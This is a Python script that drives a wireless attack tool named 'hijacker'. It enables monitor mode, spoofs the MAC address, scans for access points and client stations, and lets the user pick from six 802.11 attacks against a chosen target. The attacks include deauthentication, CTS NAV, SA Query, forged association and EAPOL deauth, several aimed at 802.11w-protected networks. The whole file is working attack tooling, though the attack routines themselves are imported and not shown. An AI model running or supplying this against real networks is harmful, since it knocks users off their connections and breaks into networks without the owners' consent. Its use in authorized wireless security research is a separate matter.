#!/usr/bin/env python3
import os
import sys
from argparse import ArgumentParser

from termcolor import cprint

from hijacker.attacks import auth_attack, sa_query_attack, cts_nav_attack, forged_1, eapol_attack_deauth
from hijacker.core import AP, Station
from hijacker.interface import MonitorInterface
from hijacker.threads import ScannerThread

MACCHANGER_BIN = '/usr/bin/macchanger'


def get_aps(mon_interface):
    targets = {}
    print("Hit Ctrl-C when ready to select a target")
    print(" {: >3}  {: <32}  {: <17}  {: <4}  {: >8}".format("#", "ESSID", "BSSID", "SEC", "80211.w"))
    print("-" * 73)
    while True:
        try:
            target = mon_interface.get_new_target()
            color, n = None, None
            n = len(targets)
            targets[n] = target
            if target.w:
                color = 'on_magenta'
            if target.essid:
                cprint("({: >3}) {: <32}  {}  {: <4}  {: >8}".format(n, target.essid,
                                                                     target.bssid, target.encrypt,
                                                                     target.w or 'no'),
                       'white', color)
        except KeyboardInterrupt:
            print()
            return targets


def get_stations(mon_interface):
    clients = {}
    print("Hit Ctrl-C when ready to select a client")
    while True:
        try:
            client = mon_interface.get_new_client()
            n = len(clients)
            clients[n] = client
            cprint("Discovered client {} ({})".format(client.mac_addr, n), 'cyan', 'on_grey')
        except KeyboardInterrupt:
            print()
            return clients


def print_attacks():
    print("1 - Deauth")
    print("2 - FakeAuth attack")
    print("3 - CTS NAV attack")
    print("4 - SA Query attack")
    print("5 - Forged Assoc. attack")
    print("6 - EAPOL Deauth attack")


def main():
    if os.getuid() != 0:
        print("Must be root!!! Exiting...")
        sys.exit()

    parser = ArgumentParser()
    parser.add_argument('mon_interface', help='The interface to use for scanning and deauth (must '
                                              'support packet injection)')
    parser.add_argument('-b', '--bssid', dest='bssid', required=False,
                        help='The target BSSID. Must support 802.11w.')
    parser.add_argument('-c', '--channel', dest='channel', type=int, required=False, help='The target BSS channel.')
    parser.add_argument('-s', '--station', dest='station', required=False, help="The MAC address of a target station.")
    parser.add_argument('-a', '--attack', dest='attack', type=int, required=False, help="The attack to perform.")
    parser.add_argument('-x', '--option', dest='option', required=False, help="An optional parameter to pass to the "
                                                                              "attack.")
    parser.add_argument('-l', action='store_true', required=False, help="List available attacks and exit.")

    args = parser.parse_args()

    if args.l:
        print_attacks()
        quit()

    mon_interface = MonitorInterface(args.mon_interface)
    cprint("Enabled monitor mode on interface " + mon_interface.name, 'yellow')

    if not os.path.isfile(MACCHANGER_BIN) or not os.access(MACCHANGER_BIN, os.X_OK):
        cprint("Warning: " + MACCHANGER_BIN + " not found. MAC spoofing will be disabled.", 'red')
        macchanger = False
    else:
        macchanger = True
        cprint("Spoofing MAC address", 'grey')
        mon_interface.spoof_mac()

    try:
        if args.bssid and args.channel:
            ap = AP(args.bssid, essid=None, encrypt="WPA2", channel=args.channel)
        else:
            ap = None
            scan_thread = ScannerThread(mon_interface)
            scan_thread.start()
            aps = get_aps(mon_interface)
            scan_thread.stop()
            scan_thread.join()

        while not ap:
            try:
                ap = aps.get(int(input("\nSelect a target access point from the list:\n")))
            except ValueError:
                pass

        mon_interface.channel = ap.channel
        mon_interface.hop = False
        mon_interface.bssid = ap.bssid

        if args.station:
            station = Station(args.station)
        else:
            station = None
            scan_thread = ScannerThread(mon_interface)
            scan_thread.start()
            stations = get_stations(mon_interface)
            scan_thread.stop()
            scan_thread.join()

        while not station:
            try:
                station = stations.get(int(input("\nSelect a target station from the list:\n")))
            except ValueError:
                pass

        attack = args.attack
        while not attack:
            print_attacks()
            try:
                attack = int(input("\nSelect an attack:\n"))
            except ValueError:
                pass

        if attack == 1:
            count = int(args.option) if args.option else 10
            mon_interface.deauth(station.mac_addr, ap.bssid, count)
        elif attack == 2:
            auth_attack(mon_interface, station, ap)
        elif attack == 3:
            cts_nav_attack(mon_interface)
        elif attack == 4:
            sa_query_attack(mon_interface, ap, station)
        elif attack == 5:
            forged_1(mon_interface, ap, station)
        elif attack == 6:
            eapol_attack_deauth(mon_interface, ap, station, spam=args.option)

    except KeyboardInterrupt:
        print()
        if macchanger:
            mon_interface.reset_mac()
            cprint("Restoring MAC address...", 'grey')
        cprint("Exiting...", 'yellow')


if __name__ == '__main__':
    main()
